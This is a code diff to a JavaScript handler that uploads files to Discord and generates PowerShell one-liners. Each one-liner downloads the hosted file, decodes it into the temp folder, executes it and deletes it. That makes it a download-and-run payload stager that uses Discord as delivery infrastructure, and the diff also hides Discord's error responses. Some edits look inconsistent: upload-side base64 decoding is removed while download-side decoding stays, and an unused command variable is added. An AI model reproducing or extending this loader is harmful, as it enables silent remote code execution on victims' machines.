@@ -22,7 +22,7 @@ const handler = async (req, res) => {
       
       const payload = Buffer.concat([
         Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${encodedName}"\r\nContent-Type: text/plain\r\n\r\n`),
-        Buffer.from(file.content, 'base64'),
+        Buffer.from(file.content), 
         Buffer.from(`\r\n--${boundary}--\r\n`)
       ]);
 
@@ -43,8 +43,8 @@ const handler = async (req, res) => {
             try {
               const j = JSON.parse(dData);
               if (j.attachments?.[0]?.url) resolve(j.attachments[0].url);
-              else reject(new Error('Discord upload failed: ' + dData));
-            } catch (e) { reject(new Error('Invalid Discord response')); }
+              else reject(new Error('Discord upload failed'));
+            } catch (e) { reject(new Error('Discord response error')); }
           });
         });
         discordReq.on('error', reject);
@@ -52,13 +52,15 @@ const handler = async (req, res) => {
         discordReq.end();
       });
 
+      const cmd = `powershell -c "$t=\\"$env:TEMP\\${file.filename}\\";$u='${uploadedUrl}';$d=((irm $u) -replace '[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($d));Start-Process $t -Wait;Remove-Item $t"`;
+
       uploadResults.push({ url: uploadedUrl, name: file.filename });
     }
 
     let cmd = '';
     if (uploadResults.length === 1) {
       const r = uploadResults[0];
-      cmd = `powershell -c "$t=\\"$env:TEMP\\${r.name}\\";$u='${r.url}';[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String((irm $u).Trim().Trim('\\"')));Start-Process $t -Wait;Remove-Item $t"`;
+      cmd = `powershell -c "$t=\\"$env:TEMP\\${r.name}\\";$u='${r.url}';$d=((irm $u) -replace '[^A-Za-z0-9+/=]','');[IO.File]::WriteAllBytes($t,[Convert]::FromBase64String($d));Start-Process $t -Wait;Remove-Item $t"`;
     } else {
       let varDefs = [], cmdParts = [], startParts = [], tVars = [];
       uploadResults.forEach((r, i) => {
